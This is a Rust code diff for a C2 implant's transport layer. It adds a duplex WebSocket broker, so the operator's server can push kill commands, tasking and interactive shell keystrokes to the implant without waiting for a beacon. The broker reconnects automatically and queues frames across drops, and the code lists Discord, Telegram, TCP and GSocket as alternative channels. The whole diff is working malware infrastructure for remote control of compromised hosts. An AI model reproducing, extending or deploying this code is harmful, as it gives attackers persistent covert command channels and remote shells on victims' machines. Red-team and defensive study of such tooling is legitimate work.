@@ -2,6 +2,7 @@ use reqwest::Client;
 use serde::Serialize;
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -27,9 +28,12 @@ pub enum Transport {
     },
     /// Persistent WebSocket carrying the same sealed-envelope protocol as the
     /// HTTP check-in, on `/c2/ws`.
+    ///
+    /// The socket is owned by a broker task, so it is duplex: beacons go out,
+    /// and server pushes (kills, tasking, shell keystrokes) come in at any time
+    /// without waiting for the next beacon.
     Ws {
-        url: String,
-        stream: Arc<tokio::sync::Mutex<Option<WsStream>>>,
+        link: Arc<WsLink>,
     },
     Tcp {
         host: String,
@@ -140,8 +144,7 @@ impl Transport {
                     format!("{base}/c2/ws")
                 };
                 Ok(Transport::Ws {
-                    url: path,
-                    stream: Arc::new(tokio::sync::Mutex::new(None)),
+                    link: Arc::new(WsLink::spawn(path)),
                 })
             }
             "grpc" | "grpcs" => Ok(Transport::Grpc {
@@ -222,7 +225,7 @@ impl Transport {
     pub fn describe(&self) -> String {
         match self {
             Transport::Http { base, .. } => base.clone(),
-            Transport::Ws { url, .. } => url.clone(),
+            Transport::Ws { link } => link.url().to_owned(),
             Transport::Discord { channel, .. } => format!("discord:{channel}"),
             Transport::Telegram { chat_id, .. } => format!("telegram:{chat_id}"),
             Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
@@ -261,7 +264,7 @@ impl Transport {
     pub async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
         match self {
             Transport::Http { client, base, web } => http_exchange(client, base, web, sealed).await,
-            Transport::Ws { url, stream } => ws_exchange(url, stream, sealed).await,
+            Transport::Ws { link } => link.exchange(sealed).await,
             Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
             Transport::GSocket {
                 host,
@@ -301,6 +304,284 @@ impl Transport {
 /// One connected WebSocket to the C2 server.
 type WsStream =
     tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;
+
+/// What the broker writes to the socket on the implant's behalf.
+enum WsOutbound {
+    /// A beacon or handshake frame; the server answers with exactly one frame.
+    Exchange {
+        frame: Vec<u8>,
+        reply: tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>,
+    },
+    /// An unsolicited frame (shell output, kill acknowledgements). No reply is
+    /// expected and none is waited for.
+    Fire(Vec<u8>),
+}
+
+/// The parked broker: the queue it drains and the channel the socket feeds.
+type ParkedBroker = (
+    tokio::sync::mpsc::UnboundedReceiver<WsOutbound>,
+    tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
+);
+
+/// The duplex owner of the C2 WebSocket.
+///
+/// One task holds the socket so beacons and live-channel writes can share it.
+/// Everything the server sends is queued on a single inbound channel: a frame
+/// is either the answer to the beacon in flight or a push, and only the caller
+/// holds the session key needed to tell those apart.
+pub struct WsLink {
+    url: String,
+    outbound: tokio::sync::mpsc::UnboundedSender<WsOutbound>,
+    inbound: std::sync::Mutex<Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>>>,
+    /// The broker task, parked until a runtime is available to run it on.
+    broker: std::sync::Mutex<Option<ParkedBroker>>,
+    started: AtomicBool,
+}
+
+impl WsLink {
+    fn spawn(url: String) -> Self {
+        // The channels need no runtime, but the broker task does, and a payload
+        // is configured before its runtime exists. So the broker is parked here
+        // and started by the first call that is already inside one.
+        let (outbound_tx, outbound_rx) = tokio::sync::mpsc::unbounded_channel();
+        let (inbound_tx, inbound_rx) = tokio::sync::mpsc::unbounded_channel();
+        Self {
+            url,
+            outbound: outbound_tx,
+            inbound: std::sync::Mutex::new(Some(inbound_rx)),
+            broker: std::sync::Mutex::new(Some((outbound_rx, inbound_tx))),
+            started: AtomicBool::new(false),
+        }
+    }
+
+    /// Start the broker on first use.
+    fn ensure_started(&self) {
+        if self.started.load(Ordering::SeqCst) {
+            return;
+        }
+        let mut parked = self.broker.lock().expect("ws link poisoned");
+        let Some((outbound_rx, inbound_tx)) = parked.take() else {
+            return;
+        };
+        let Ok(handle) = tokio::runtime::Handle::try_current() else {
+            // Still no runtime: keep the broker parked and try again next time.
+            *parked = Some((outbound_rx, inbound_tx));
+            return;
+        };
+        let url = self.url.clone();
+        handle.spawn(async move { ws_broker(url, outbound_rx, inbound_tx).await });
+        self.started.store(true, Ordering::SeqCst);
+    }
+
+    pub fn url(&self) -> &str {
+        &self.url
+    }
+
+    /// Take the inbound queue. Only the beacon loop consumes it, so the
+    /// receiver is handed over exactly once.
+    pub fn take_inbound(&self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>> {
+        self.ensure_started();
+        self.inbound.lock().ok()?.take()
+    }
+
+    /// Send a frame whose reply is the next frame the server writes.
+    async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
+        self.ensure_started();
+        let (reply, wait) = tokio::sync::oneshot::channel();
+        self.outbound
+            .send(WsOutbound::Exchange {
+                frame: sealed.to_vec(),
+                reply,
+            })
+            .map_err(|_| "ws link is closed".to_string())?;
+        match wait.await {
+            Ok(result) => result,
+            // The broker dropped the sender: the socket died mid-exchange.
+            Err(_) => Err("ws exchange was abandoned".to_string()),
+        }
+    }
+
+    /// Write a frame without waiting for anything back.
+    ///
+    /// Reachable from the shell's reader threads, so it starts the broker if
+    /// nothing has needed it yet.
+    pub fn send(&self, sealed: &[u8]) -> Result<(), String> {
+        self.ensure_started();
+        self.outbound
+            .send(WsOutbound::Fire(sealed.to_vec()))
+            .map_err(|_| "ws link is closed".to_string())
+    }
+}
+
+impl Transport {
+    /// Whether the server can reach this implant without waiting for a beacon.
+    pub fn is_live(&self) -> bool {
+        matches!(self, Transport::Ws { .. })
+    }
+
+    /// The queue of frames the server has pushed since the last beacon.
+    ///
+    /// Taken once by the beacon loop, which owns everything that arrives on the
+    /// live channel.
+    pub fn take_live_inbound(&self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>> {
+        match self {
+            Transport::Ws { link } => link.take_inbound(),
+            _ => None,
+        }
+    }
+
+    /// Write a frame to the server outside the beacon cycle.
+    ///
+    /// Only a duplex carrier can do this; every other transport is strictly
+    /// request/response, so a caller must have a beacon to carry the payload.
+    pub fn send_live(&self, sealed: &[u8]) -> Result<(), String> {
+        match self {
+            Transport::Ws { link } => link.send(sealed),
+            _ => Err("transport has no live channel".to_string()),
+        }
+    }
+}
+
+/// Own the socket for the implant's lifetime: connect, reconnect, forward.
+///
+/// A dropped socket must not drop queued work, so outbound frames are buffered
+/// across a reconnect and every in-flight exchange is failed (the caller then
+/// retries on its next beacon) rather than left hanging.
+async fn ws_broker(
+    url: String,
+    mut outbound: tokio::sync::mpsc::UnboundedReceiver<WsOutbound>,
+    inbound: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
+) {
+    // Frames to write that were produced while the socket was down.
+    let mut queued: std::collections::VecDeque<WsOutbound> = std::collections::VecDeque::new();
+    let mut pending_reply: Option<tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>> = None;
+
+    loop {
+        let socket = match ws_connect(&url).await {
+            Ok(socket) => socket,
+            Err(error) => {
+                tracing::debug!(%error, "ws connect failed; retrying");
+                tokio::time::sleep(Duration::from_secs(5)).await;
+                continue;
+            }
+        };
+        tracing::debug!(url = %url, "live channel established");
+
+        let mut socket = socket;
+        let mut failed: Vec<WsOutbound> = Vec::new();
+        let mut reconnect = false;
+        while !reconnect {
+            // Anything left over from the previous connection goes first, so a
+            // push made just before a drop is delivered after the reconnect.
+            while let Some(item) = queued.pop_front() {
+                match write_ws(&mut socket, item, &mut pending_reply, &mut failed).await {
+                    Ok(()) => {}
+                    Err(()) => {
+                        reconnect = true;
+                        break;
+                    }
+                }
+            }
+            if reconnect {
+                break;
+            }
+
+            tokio::select! {
+                item = outbound.recv() => {
+                    let Some(item) = item else { return };
+                    if write_ws(&mut socket, item, &mut pending_reply, &mut failed).await.is_err() {
+                        reconnect = true;
+                    }
+                }
+                frame = next_ws_frame(&mut socket) => {
+                    match frame {
+                        // A frame arriving while a beacon is outstanding is that
+                        // beacon's reply; anything else is a live-channel push.
+                        // The beacon loop never has two exchanges in flight, so
+                        // the distinction needs no protocol marker.
+                        Some(Ok(bytes)) => {
+                            let delivered = match pending_reply.take() {
+                                Some(reply) => reply.send(Ok(bytes)).is_ok(),
+                                None => inbound.send(bytes).is_ok(),
+                            };
+                            if !delivered {
+                                return;
+                            }
+                        }
+                        Some(Err(_)) | None => reconnect = true,
+                    }
+                }
+            }
+        }
+
+        tracing::debug!("live channel dropped; reconnecting");
+        // Tell the caller this exchange died so it can retry on the next beacon.
+        if let Some(reply) = pending_reply.take() {
+            let _ = reply.send(Err("ws closed by peer".to_string()));
+        }
+        // Re-queue what could not be written. At most one reply is in flight,
+        // so the deque stays short.
+        queued.extend(failed);
+        if queued.len() > 64 {
+            queued.drain(..queued.len() - 64);
+        }
+        tokio::time::sleep(Duration::from_secs(2)).await;
+    }
+}
+
+async fn ws_connect(url: &str) -> Result<WsStream, String> {
+    // SECURITY: `url` is operator-configured; the subprotocol is fixed.
+    let request =
+        tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(url)
+            .map_err(|error| format!("ws request {url}: {error}"))?;
+    let (socket, _reply) = tokio_tungstenite::connect_async(request)
+        .await
+        .map_err(|error| format!("ws connect {url}: {error}"))?;
+    Ok(socket)
+}
+
+async fn write_ws(
+    socket: &mut WsStream,
+    item: WsOutbound,
+    pending_reply: &mut Option<tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>>,
+    failed: &mut Vec<WsOutbound>,
+) -> Result<(), ()> {
+    use futures_util::SinkExt;
+    use tokio_tungstenite::tungstenite::Message;
+
+    match item {
+        WsOutbound::Fire(frame) => socket.send(Message::Binary(frame)).await.map_err(|_| ()),
+        WsOutbound::Exchange { frame, reply } => {
+            if socket.send(Message::Binary(frame.clone())).await.is_err() {
+                failed.push(WsOutbound::Exchange { frame, reply });
+                return Err(());
+            }
+            // One exchange at a time: a beacon holds the socket until its reply
+            // arrives, which is what keeps replies matched to their requests.
+            if pending_reply.is_some() {
+                failed.push(WsOutbound::Exchange { frame, reply });
+            } else {
+                *pending_reply = Some(reply);
+            }
+            Ok(())
+        }
+    }
+}
+
+async fn next_ws_frame(socket: &mut WsStream) -> Option<Result<Vec<u8>, ()>> {
+    use futures_util::StreamExt;
+    use tokio_tungstenite::tungstenite::Message;
+
+    loop {
+        match socket.next().await {
+            Some(Ok(Message::Binary(bytes))) => return Some(Ok(bytes)),
+            // Ping/Pong are handled by tungstenite; text and close frames carry
+            // nothing the protocol uses.
+            Some(Ok(_)) => continue,
+            Some(Err(_)) | None => return Some(Err(())),
+        }
+    }
+}
 
 pub struct GSocketForward {
     executable: PathBuf,
@@ -444,61 +725,6 @@ async fn http_exchange(
     let resp = resp.error_for_status().map_err(|e| e.to_string())?;
     let body = resp.bytes().await.map_err(|e| e.to_string())?;
     Ok(body.to_vec())
-}
-
-/// Exchange one sealed frame over a persistent WebSocket.
-///
-/// The socket is opened on first use and reused for every beacon, so the
-/// handshake is paid once per implant rather than once per poll. Any send or
-/// receive failure drops the socket so the next call reconnects.
-async fn ws_exchange(
-    url: &str,
-    stream: &tokio::sync::Mutex<Option<WsStream>>,
-    sealed: &[u8],
-) -> Result<Vec<u8>, String> {
-    use futures_util::{SinkExt, StreamExt};
-    use tokio_tungstenite::tungstenite::Message;
-
-    let mut guard = stream.lock().await;
-    if guard.is_none() {
-        // SECURITY: `url` is operator-configured; the subprotocol is fixed.
-        let request =
-            tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(url)
-                .map_err(|e| format!("ws request {url}: {e}"))?;
-        let (socket, _reply) = tokio_tungstenite::connect_async(request)
-            .await
-            .map_err(|e| format!("ws connect {url}: {e}"))?;
-        *guard = Some(socket);
-    }
-
-    // Move the stream out for the duration of the exchange so a send/receive
-    // failure can drop it (leave the slot `None`) without a second borrow.
-    let mut socket = match guard.take() {
-        Some(socket) => socket,
-        None => return Err("ws stream unavailable".into()),
-    };
-
-    let outcome = async {
-        socket
-            .send(Message::Binary(sealed.to_vec()))
-            .await
-            .map_err(|e| format!("ws send: {e}"))?;
-        loop {
-            match socket.next().await {
-                Some(Ok(Message::Binary(reply))) => return Ok(reply),
-                Some(Ok(_)) => continue,
-                Some(Err(e)) => return Err(format!("ws receive: {e}")),
-                None => return Err("ws closed by peer".into()),
-            }
-        }
-    }
-    .await;
-
-    // Keep the socket for the next beacon only when the exchange succeeded.
-    if outcome.is_ok() {
-        *guard = Some(socket);
-    }
-    outcome
 }
 
 /// Post the frame into a Discord channel, then poll for the reply.
